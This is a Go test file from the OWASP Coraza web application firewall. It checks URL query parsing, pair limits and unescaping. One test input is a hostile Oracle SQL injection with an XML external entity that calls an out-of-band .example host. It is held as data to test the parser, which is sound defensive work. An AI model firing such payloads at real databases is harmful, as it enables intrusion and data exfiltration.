// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package url

import (
	"errors"
	"testing"
)

var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`

func TestUrlPayloads(t *testing.T) {
	q, _, err := ParseQuery(parseQueryInput, '&', 0)
	if !errors.Is(err, ErrInvalidURLEncoding) {
		t.Fatalf("expected ErrInvalidURLEncoding, got %v", err)
	}
	if len(q["var"]) == 0 {
		t.Error("var is empty")
	}
}

func TestParseQueryLimit(t *testing.T) {
	q, truncated, _ := ParseQuery("a=1&b=2&c=3&d=4", '&', 2)
	if !truncated {
		t.Error("expected truncated to be true")
	}
	if len(q) != 2 {
		t.Errorf("expected 2 parsed pairs, got %d: %v", len(q), q)
	}

	q, truncated, _ = ParseQuery("a=1&b=2&c=3&d=4", '&', 10)
	if truncated {
		t.Error("expected truncated to be false when limit is not reached")
	}
	if len(q) != 4 {
		t.Errorf("expected 4 parsed pairs, got %d: %v", len(q), q)
	}

	q, truncated, _ = ParseQuery("a=1&b=2", '&', 0)
	if truncated {
		t.Error("expected truncated to be false when limit is 0 (no limit)")
	}
	if len(q) != 2 {
		t.Errorf("expected 2 parsed pairs, got %d: %v", len(q), q)
	}
}

func TestParseQueryLimitCountsTotalPairsNotDistinctKeys(t *testing.T) {
	// Many values under a single repeated key must still be bounded by the
	// limit, not just the number of distinct keys.
	q, truncated, _ := ParseQuery("a=1&a=1&a=1&a=1&a=1", '&', 2)
	if !truncated {
		t.Error("expected truncated to be true")
	}
	if got := len(q["a"]); got != 2 {
		t.Errorf("expected 2 values under repeated key 'a', got %d: %v", got, q["a"])
	}
}

func TestParseQueryOrdered(t *testing.T) {
	pairs, truncated, _ := ParseQueryOrdered("a=1&b=2&c=3", '&', 0)
	if truncated {
		t.Error("expected truncated to be false when limit is 0 (no limit)")
	}
	want := []KeyValue{{Key: "a", Value: "1"}, {Key: "b", Value: "2"}, {Key: "c", Value: "3"}}
	if len(pairs) != len(want) {
		t.Fatalf("expected %d pairs, got %d: %v", len(want), len(pairs), pairs)
	}
	for i, kv := range want {
		if pairs[i] != kv {
			t.Errorf("pair %d: got %+v, want %+v", i, pairs[i], kv)
		}
	}
}

func TestParseQueryOrderedLimit(t *testing.T) {
	pairs, truncated, _ := ParseQueryOrdered("a=1&b=2&c=3&d=4", '&', 2)
	if !truncated {
		t.Error("expected truncated to be true")
	}
	if len(pairs) != 2 {
		t.Fatalf("expected 2 pairs, got %d: %v", len(pairs), pairs)
	}
	if pairs[0].Key != "a" || pairs[1].Key != "b" {
		t.Errorf("expected pairs in order [a b], got %v", pairs)
	}
}

// TestParseQueryLimitTrailingSeparatorAtLimit is a regression test: the limit
// check used to run before the empty-key skip, so a trailing separator right
// at the limit reported truncation even though nothing more was dropped.
func TestParseQueryLimitTrailingSeparatorAtLimit(t *testing.T) {
	q, truncated, _ := ParseQuery("a=1&b=2&&", '&', 2)
	if truncated {
		t.Error("expected truncated to be false: the trailing '&&' adds no pair beyond the limit")
	}
	if len(q) != 2 {
		t.Errorf("expected 2 parsed pairs, got %d: %v", len(q), q)
	}
}

// TestParseQueryOrderedTrailingSeparatorAtLimit mirrors
// TestParseQueryLimitTrailingSeparatorAtLimit for the ordered parser.
func TestParseQueryOrderedTrailingSeparatorAtLimit(t *testing.T) {
	pairs, truncated, _ := ParseQueryOrdered("a=1&b=2&&", '&', 2)
	if truncated {
		t.Error("expected truncated to be false: the trailing '&&' adds no pair beyond the limit")
	}
	if len(pairs) != 2 {
		t.Errorf("expected 2 parsed pairs, got %d: %v", len(pairs), pairs)
	}
}

func BenchmarkParseQuery(b *testing.B) {
	for i := 0; i < b.N; i++ {
		_, _, _ = ParseQuery(parseQueryInput, '&', 0)
	}
}

func BenchmarkParseQueryLimited(b *testing.B) {
	for i := 0; i < b.N; i++ {
		_, _, _ = ParseQuery(parseQueryInput, '&', 1)
	}
}

var queryUnescapePayloads = map[string]struct {
	value string
	err   error
}{
	"sample":    {"sample", nil},
	"s%20ample": {"s ample", nil},
	"s+ample":   {"s ample", nil},
	"s%2fample": {"s/ample", nil},
	"s% ample":  {"s% ample", ErrInvalidURLEncoding},
	"s%ssample": {"s%ssample", ErrInvalidURLEncoding},
	"s%00ample": {"s\x00ample", nil},
	"%7B%%7d":   {"{%}", ErrInvalidURLEncoding},
	"%7B+%+%7d": {"{ % }", ErrInvalidURLEncoding},
}

func TestQueryUnescape(t *testing.T) {
	for k, v := range queryUnescapePayloads {
		t.Run(k, func(t *testing.T) {
			if out, err := queryUnescape(k); out != v.value || !errors.Is(err, v.err) {
				t.Errorf("Error parsing %q, got %q and err=%v; expected %q and err=%v", k, out, err, v.value, v.err)
			}
		})
	}
}

func BenchmarkQueryUnescape(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for k := range queryUnescapePayloads {
			_, _ = queryUnescape(k)
		}
	}
}
